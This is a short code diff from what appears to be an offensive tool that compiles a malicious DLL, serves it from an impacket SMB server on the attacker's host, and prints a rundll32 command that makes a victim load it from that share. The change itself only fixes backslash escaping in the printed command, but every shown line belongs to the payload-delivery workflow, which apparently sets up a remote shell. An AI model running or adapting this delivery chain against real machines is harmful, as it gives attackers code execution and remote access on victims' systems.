@@ -82,5 +82,6 @@ subprocess.run(f"x86_64-w64-mingw32-gcc -shared -o {dll_name}.dll smb_delivery.c
 subprocess.run("rm -f ./smb_delivery.c ./shell.c",shell=True)
 
 # Run and SMB server to host the dll
-print(f"Run this command: {colored(f'rundll32.exe \\\\{args.lhost}\\{share_name}\\{dll_name}.dll,0','red',attrs=['bold'])}")
+slash = '\\'
+print(f"Run this command: {colored(f'rundll32.exe {slash+slash}{args.lhost}{slash}{share_name}{slash}{dll_name}.dll,0','red',attrs=['bold'])}")
 subprocess.call(f"impacket-smbserver {share_name} .  -ip {args.lhost} -smb2support",shell=True)
